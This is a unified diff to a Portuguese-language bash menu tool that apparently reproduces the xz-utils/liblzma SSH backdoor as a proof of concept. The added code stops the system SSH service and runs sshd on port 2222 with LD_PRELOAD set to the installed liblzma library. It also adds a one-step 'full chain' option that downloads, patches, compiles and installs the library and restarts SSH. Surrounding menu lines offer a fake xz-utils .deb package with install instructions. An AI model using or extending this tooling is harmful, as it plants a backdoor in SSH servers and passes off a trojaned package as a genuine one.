@@ -64,7 +64,9 @@ menu_principal(){
   echo " 5) Reiniciar SSH e verificar backdoor"
   echo " 6) Verificação técnica (LDD + Journal)"
   echo " 7) Gerar arquivo .deb falso (opcional)"
-  echo " 8) Sair"
+  echo " 8) Forçar SSH com LD_PRELOAD (Modo PoC)"
+  echo " 9) Configuração Automática (Full Chain)"
+  echo " 10) Sair"
   printf "\nEscolha: "; read -r opt
   case $opt in
     1) f_download;;
@@ -74,7 +76,9 @@ menu_principal(){
     5) f_restart_ssh;;
     6) f_verify;;
     7) f_deb_fake;;
-    8) exit 0;;
+    8) f_force_ssh_preload;;
+    9) f_auto_setup;;
+    10) exit 0;;
     *) warn "Opção inválida"; sleep 1; menu_principal;;
   esac
 }
@@ -223,6 +227,41 @@ f_deb_fake(){
                make install
   ok "Pacote .deb criado em /usr/src/xz-utils_5.6.0-1_amd64.deb"
   echo "Instale com: sudo dpkg -i xz-utils_5.6.0-1_amd64.deb"
+  sleep 3
+  menu_principal
+}
+
+# ------------ 8) forçar ssh com preload ------------
+f_force_ssh_preload(){
+  check_root
+  local libdir="/usr/lib"
+  [[ "$(uname -m)" == "x86_64" ]] && libdir="/usr/lib/x86_64-linux-gnu"
+  
+  local target_lib="$libdir/$LIBLZMA_SO"
+  [[ -f "$target_lib" ]] || die "Biblioteca não encontrada em $target_lib. Instale primeiro (opção 4)."
+
+  msg "Parando serviço SSH padrão..."
+  systemctl stop ssh || true
+  systemctl stop sshd || true
+
+  msg "Iniciando SSH manual na porta 2222 com LD_PRELOAD..."
+  echo -e "${YELLOW}Aperte CTRL+C para encerrar o servidor SSH de teste.${NC}"
+  LD_PRELOAD="$target_lib" /usr/sbin/sshd -D -p 2222 -e || warn "SSH encerrado."
+  
+  sleep 2
+  menu_principal
+}
+
+# ------------ 9) setup automático ------------
+f_auto_setup(){
+  check_root
+  msg "Iniciando instalação completa automática..."
+  f_download
+  f_patch
+  f_compile
+  f_install
+  f_restart_ssh
+  ok "Tudo pronto! Se o LDD falhar, use a Opção 8 no menu."
   sleep 3
   menu_principal
 }
